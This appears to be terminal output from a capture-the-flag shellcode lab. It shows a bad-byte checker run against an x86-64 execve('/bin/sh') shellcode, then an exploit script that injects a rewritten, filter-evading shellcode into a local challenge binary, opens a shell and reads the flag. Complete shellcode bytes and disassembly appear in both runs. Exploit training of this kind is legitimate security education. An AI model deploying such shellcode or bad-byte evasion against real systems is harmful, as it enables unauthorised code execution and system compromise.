```
python3 check-shellcode.py 
[*] ----------------------------
[*] Finding Bad Bytes in Shellcode:
[!]     Bad Byte: 0x6a
[!]     Bad Byte: 0x68
[!]     Bad Byte: 0x48
[!]     Bad Byte: 0xb8
[!]     Bad Byte: 0x62
[!]     Bad Byte: 0x6e
[!]     Bad Byte: 0x50
[!]     Bad Byte: 0x48
[!]     Bad Byte: 0x68
[!]     Bad Byte: 0x72
[!]     Bad Byte: 0x34
[!]     Bad Byte: 0x24
[!]     Bad Byte: 0xf6
[!]     Bad Byte: 0x56
[!]     Bad Byte: 0x6a
[!]     Bad Byte: 0x8
[!]     Bad Byte: 0x5e
[!]     Bad Byte: 0x48
[!]     Bad Byte: 0xe6
[!]     Bad Byte: 0x56
[!]     Bad Byte: 0x48
[!]     Bad Byte: 0xe6
[!]     Bad Byte: 0xd2
[!]     Bad Byte: 0x6a
[!]     Bad Byte: 0x58
[*] ----------------------------
[*] Total Violations: 25
[*] ----------------------------
[*]    0:   6a 68                   push   0x68
       2:   48 b8 2f 62 69 6e 2f 2f 2f 73   movabs rax, 0x732f2f2f6e69622f
       c:   50                      push   rax
       d:   48 89 e7                mov    rdi, rsp
      10:   68 72 69 01 01          push   0x1016972
      15:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp], 0x1010101
      1c:   31 f6                   xor    esi, esi
      1e:   56                      push   rsi
      1f:   6a 08                   push   0x8
      21:   5e                      pop    rsi
      22:   48 01 e6                add    rsi, rsp
      25:   56                      push   rsi
      26:   48 89 e6                mov    rsi, rsp
      29:   31 d2                   xor    edx, edx
      2b:   6a 3b                   push   0x3b
      2d:   58                      pop    rax
      2e:   0f 05                   syscall
[*] Testing Shellcode Execution
[*] ----------------------------
[*] Shellcode Bytes: b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
```

```
python3 pwn-shellcode.py BIN=./chal    
[*] '/demos/shellcode-demo/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Shellcode: 
   0:   4d 31 ff                xor    r15, r15
   3:   41 b7 35                mov    r15b, 0x35
   6:   49 83 c7 33             add    r15, 0x33
   a:   41 57                   push   r15
   c:   4d 31 ff                xor    r15, r15
   f:   49 bf 29 5f 63 6b 2f 2f 2f 73   movabs r15, 0x732f2f2f6b635f29
  19:   49 81 c7 83 01 83 01    add    r15, 0x1830183
  20:   49 81 c7 83 01 83 01    add    r15, 0x1830183
  27:   41 57                   push   r15
  29:   49 87 e1                xchg   r9, rsp
  2c:   49 87 f9                xchg   r9, rdi
  2f:   4d 31 ed                xor    r13, r13
  32:   49 87 f5                xchg   r13, rsi
  35:   4d 31 ed                xor    r13, r13
  38:   49 87 d5                xchg   r13, rdx
  3b:   41 b1 3b                mov    r9b, 0x3b
  3e:   49 91                   xchg   r9, rax
  40:   0f 05                   syscall
[+] Starting local process '/demos/shellcode-demo/chal': pid 4847
[*] Switching to interactive mode
$ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}
```